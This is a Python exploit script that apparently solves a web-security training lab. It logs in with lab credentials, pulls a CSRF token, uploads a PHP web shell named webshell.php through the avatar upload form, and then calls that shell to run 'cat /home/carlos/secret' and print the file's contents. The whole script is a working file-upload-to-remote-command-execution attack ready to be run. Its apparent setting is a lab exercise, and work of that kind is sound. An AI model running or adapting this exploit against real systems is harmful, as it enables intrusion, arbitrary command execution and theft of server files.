import requests
import sys
from bs4 import BeautifulSoup

def extract_csrf_token(response):
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrf'})['value']
    return csrf_token

def login():
    url = f"{lab_url}/login"
    res = requests.get(url)
    session_cookie = res.cookies.values()[0]
    csrf_token = extract_csrf_token(res)
    cookies = {
        "session": session_cookie
    }


    login_data = {
        "csrf": csrf_token,
        "username": "wiener",
        "password": "peter"
    }

    response = requests.post(url, cookies=cookies, data=login_data, allow_redirects=False)
    cookie = response.cookies.values()[0]
    return cookie


def upload_file():
    csrf_url = f"{lab_url}/my-account"
    cookies = {
        "session": cookie
    }
    res = requests.get(csrf_url, cookies=cookies)
    csrf_token = extract_csrf_token(res)

    headers = {
        "Content-Type": "multipart/form-data; boundary=---------------------------399354988410166897681408736201"
    }

    payload = (
        "-----------------------------399354988410166897681408736201\r\n"
        "Content-Disposition: form-data; name=\"avatar\"; filename=\"webshell.php\"\r\n"
        "Content-Type: application/x-php\r\n\r\n"
        "<?php system($_GET['cmd']); ?>\r\n"
        "-----------------------------399354988410166897681408736201\r\n"
        "Content-Disposition: form-data; name=\"user\"\r\n\r\n"
        "wiener\r\n"
        "-----------------------------399354988410166897681408736201\r\n"
        "Content-Disposition: form-data; name=\"csrf\"\r\n\r\n"
        f"{csrf_token}\r\n"
        "-----------------------------399354988410166897681408736201--\r\n"
    )
    upload_url = f"{lab_url}/my-account/avatar"
    response = requests.post(upload_url, headers=headers, cookies=cookies, data=payload)

def execute_command():
    cookies = {
        "session": cookie
    }
    response = requests.get(f"{lab_url}/files/avatars/webshell.php?cmd=cat%20/home/carlos/secret", cookies=cookies)
    print(response.text)


if __name__=="__main__":
    try:
        lab_url = sys.argv[1].rstrip('/')
        cookie = login()
        print("Uploading file webshell.php")
        upload_file()
        print("File avatars/webshell.php has been uploaded")
        print("The contents of the /home/carlos/secret file: ", end='')
        execute_command()

    except IndexError:
        print(f"Usage: python3 {sys.argv[0]} <url> \nExample: python3 {sys.argv[0]} https://example.com")
